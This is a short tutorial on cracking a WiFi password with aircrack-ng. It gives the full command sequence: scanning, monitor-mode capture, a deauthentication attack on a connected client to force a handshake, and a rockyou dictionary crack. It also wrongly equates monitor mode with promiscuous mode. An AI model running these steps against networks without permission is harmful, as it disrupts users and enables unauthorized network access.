# Cracking Wifi Networks With Aircrack-ng

In this tutorial, I'll take you through attacking a Wifi network using Aircrack-ng by way of a deauthentication attack.


First thing's first, we need to stop some things that like to hog the wireless interfaces.

![systemctl stop NetworkManager; systemctl stop wpa_supplicant](images/aircrack/stopservices.png)


Next, we need to be able to list available wifi networks for us to attack. In most GUI's this is trivial, but we'll do it from the command line using 'iwlist'.

![ip link set wlan0 up; iwlist wlan0 scan | grep ESSID:](images/aircrack/iwlistscan.png)


Now that we know which network we'd like to attack, we need to put our interface into promiscuous mode using airmon-ng. This is basically the same as running ```ip link set wlan0 promisc; ip link set wlan0 up```.

![airmon-ng start wlan0](images/aircrack/airmonstart.png)


Now, let's start listening.

![airodump-ng -w test -c 7 -N test wlan0mon](images/aircrack/airodump.png)
![airodump-ng output](images/aircrack/airodumpout.png)

The flags here, -w specifies which prefix to use when writing your files, -c specifies the wifi channel to listen on. This is also available in the output of iwlist, but it's a double-edged sword. If you don't specify this, airodump will switch channels rapidly in an effort to capture everything; however, if you do specify this, it's important to keep in mind that most access points will switch channels every so often in order to avoid interference.

We can also see the client AA:BB:CC:DD:EE:FF connected to our target network.


Of course, no matter how long we wait, we might never capture a handshake, so let's generate one ourselves with aireplay-ng.

![aireplay-ng -0 1 -e test -c aa:bb:cc:dd:ee:ff wlan0mon](images/aircrack/aireplaydeauth.png)

This impersonates the access point and tells the client to deauthenticate from the network. Of course, most clients will automatically rejoin, providing us with our much-needed handshake.


Now, we can see 'EAPOL' listed in the notes section of the airodump-ng output.

![airodump-ng output after our deauth attack](images/aircrack/airodumpoutafterdeauth.png)


This means we have everything we need, so let's copy over the rockyou wordlist and start cracking.

![cp /usr/share/wordlists/rockyou.txt.gz .; gunzip rockyou.txt.gz](images/aircrack/rockyou.png)
![aircrack-ng -w rockyou.txt test-01.cap](images/aircrack/aircrack.png)
![aircrack-ng output showing a successful cracking session](images/aircrack/aircrackout.png)
